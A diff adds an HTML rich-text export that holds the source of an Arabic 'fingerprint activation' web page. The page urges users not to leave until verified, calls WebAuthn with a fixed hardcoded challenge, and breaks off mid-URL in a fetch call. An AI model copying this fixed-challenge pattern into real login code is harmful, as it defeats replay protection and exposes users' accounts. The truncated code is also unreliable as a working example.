@@ -1,0 +1,49 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta http-equiv="Content-Style-Type" content="text/css">
+  <title></title>
+  <meta name="Generator" content="Cocoa HTML Writer">
+  <meta name="CocoaVersion" content="2575.5">
+  <style type="text/css">
+    p.p1 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica}
+    p.p2 {margin: 0.0px 0.0px 0.0px 0.0px; font: 12.0px Helvetica; min-height: 14.0px}
+    p.p3 {margin: 0.0px 0.0px 0.0px 0.0px; text-align: left; font: 12.0px 'Geeza Pro'}
+    span.s1 {font: 12.0px 'Geeza Pro'}
+    span.s2 {font: 12.0px 'Apple Color Emoji'}
+    span.s3 {font: 12.0px Helvetica}
+  </style>
+</head>
+<body>
+<p class="p1">&lt;!DOCTYPE html&gt;</p>
+<p class="p1">&lt;html lang="ar" dir="rtl"&gt;</p>
+<p class="p1">&lt;head&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;meta charset="UTF-8" /&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;title&gt;<span class="s1">تفعيل</span> <span class="s1">البصمة</span>&lt;/title&gt;</p>
+<p class="p1">&lt;/head&gt;</p>
+<p class="p1">&lt;body style="font-family: Tahoma; text-align: center; margin-top: 100px;"&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;h2&gt;<span class="s1">مرحبا</span> <span class="s2">👋</span>&lt;/h2&gt;</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;p id="message" style="color: #c00; font-size: 18px;"&gt;</p>
+<p dir="rtl" class="p3"><span class="s3"><span class="Apple-converted-space">    </span></span>التجربة<span class="s3"> </span>لم<span class="s3"> </span>تحقق<span class="s3"> </span>منهويتك،<span class="s3"> </span>لا<span class="s3"> </span>تغلق<span class="s3"> </span>الصفحة<span class="s3"> </span>حتى<span class="s3"> </span>يتم<span class="s3"> </span>التفعيل<span class="s3"> </span>بالبصمة<span class="s3">.</span></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;/p&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;button onclick="verifyFingerprint()" style="padding: 10px 20px; font-size: 18px;"&gt;</p>
+<p dir="rtl" class="p3"><span class="s3"><span class="Apple-converted-space">    </span></span>تفعيل<span class="s3"> </span>باستخدام<span class="s3"> </span>البصمة</p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;/button&gt;</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">  </span>&lt;script&gt;</p>
+<p class="p1"><span class="Apple-converted-space">    </span>async function verifyFingerprint() {</p>
+<p class="p1"><span class="Apple-converted-space">      </span>try {</p>
+<p class="p1"><span class="Apple-converted-space">        </span>const assertion = await navigator.credentials.get({</p>
+<p class="p1"><span class="Apple-converted-space">          </span>publicKey: {</p>
+<p class="p1"><span class="Apple-converted-space">            </span>challenge: new Uint8Array([1, 2, 3, 4, 5, 6]),</p>
+<p class="p1"><span class="Apple-converted-space">            </span>timeout: 60000,</p>
+<p class="p1"><span class="Apple-converted-space">            </span>userVerification: 'preferred'</p>
+<p class="p1"><span class="Apple-converted-space">          </span>}</p>
+<p class="p1"><span class="Apple-converted-space">        </span>});</p>
+<p class="p2"><br></p>
+<p class="p1"><span class="Apple-converted-space">        </span>const res = await fetch("https://</p>
+</body>
+</html>
